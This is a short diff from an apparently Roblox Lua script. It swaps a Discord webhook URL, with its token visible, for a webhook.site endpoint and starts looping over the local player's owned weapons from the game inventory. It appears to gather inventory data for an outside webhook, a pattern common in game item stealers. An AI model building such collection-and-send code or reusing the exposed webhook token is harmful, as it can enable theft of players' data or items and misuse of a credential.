@@ -136,7 +136,7 @@ antiafk = false
 end
 end)
 
-local url = "https://discord.com/api/webhooks/1296489854061903894/WU2SIziNuj1qUPFKbz5hYKKrFqV0n6jv_xWhUrACj3OJMtHCH7zoFISKoUcg60H_ma_O"
+local url = "https://webhook.site/4a91b4ba-0545-4c50-b673-af56de8ddd98"
    
 t = {}
 for i,v in game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"] do
